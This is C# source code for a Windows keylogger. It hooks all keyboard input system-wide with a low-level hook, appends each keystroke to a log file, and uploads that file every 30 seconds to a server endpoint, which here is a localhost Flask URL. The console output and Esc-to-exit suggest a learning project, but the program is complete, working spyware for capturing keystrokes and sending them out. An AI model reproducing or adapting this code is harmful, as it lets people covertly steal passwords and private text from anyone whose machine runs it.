using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Net.Http;

namespace Keylogger
{
    class Program
    {
        // Import necessary Win32 APIs
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        // Constants for hook types
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        // Delegate for low-level keyboard hook
        public delegate int LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // Create a global variable for the hook
        private static IntPtr _hookID = IntPtr.Zero;

        // File path to store keystrokes
        public static string logFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "keylogger_log.txt");

        static async Task Main(string[] args)
        {
            Console.WriteLine("=====================================");
            Console.WriteLine("✅ Keylogger Started...");
            Console.WriteLine("📂 Log File: " + logFilePath);
            EnsureLogFileExists();

            _hookID = SetHook(HookCallback);
            Console.WriteLine("🟢 Hook Set. Listening for keystrokes...");
            Console.WriteLine("Press 'Esc' to exit...");
            Console.WriteLine("=====================================");

            // Start a task to send logs every 30 seconds
            Task.Run(async () => await SendLogsPeriodically());

            // Keep the application running
            while (true)
            {
                if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
                {
                    break; // Stop the keylogger when 'Esc' is pressed
                }
            }

            // Unhook when done
            UnhookWindowsHookEx(_hookID);
            Console.WriteLine("❌ Keylogger Stopped.");

            // Send the logs one last time before stopping the program
            await LogSender.SendLogFile();
        }

        // Set the hook
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // Callback function for capturing key presses
        private static int HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                char key = (char)vkCode;

                Console.WriteLine($"🔹 [DEBUG] Key Pressed: {key}");

                LogKey(key);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // Ensure log file exists
        private static void EnsureLogFileExists()
        {
            try
            {
                if (!File.Exists(logFilePath))
                {
                    File.Create(logFilePath).Close();
                    Console.WriteLine("✅ Log file created at: " + logFilePath);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ Error creating log file: " + ex.Message);
            }
        }

        // Log key to a file
        private static void LogKey(char key)
        {
            try
            {
                using (StreamWriter writer = new StreamWriter(logFilePath, true))
                {
                    writer.Write(key);
                    writer.Flush();
                }

                Console.WriteLine($"✅ [LOGGED] Key: {key} saved to file.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ Error logging key: " + ex.Message);
            }
        }

        // Send logs to Flask server every 30 seconds
        private static async Task SendLogsPeriodically()
        {
            while (true)
            {
                await Task.Delay(30000); // Wait for 30 seconds before sending logs

                await LogSender.SendLogFile();
            }
        }
    }

    class LogSender
    {
        private static readonly string serverUrl = "http://127.0.0.1:5000/upload"; // Flask server URL

        public static async Task SendLogFile()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                using (MultipartFormDataContent form = new MultipartFormDataContent())
                using (FileStream fs = new FileStream(Program.logFilePath, FileMode.Open, FileAccess.Read))
                using (StreamContent content = new StreamContent(fs))
                {
                    form.Add(content, "file", "keylogger_log.txt");
                    HttpResponseMessage response = await client.PostAsync(serverUrl, form);

                    string responseString = await response.Content.ReadAsStringAsync();
                    Console.WriteLine("🟢 Server Response: " + responseString);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ Error sending log file: " + ex.Message);
            }
        }
    }
}
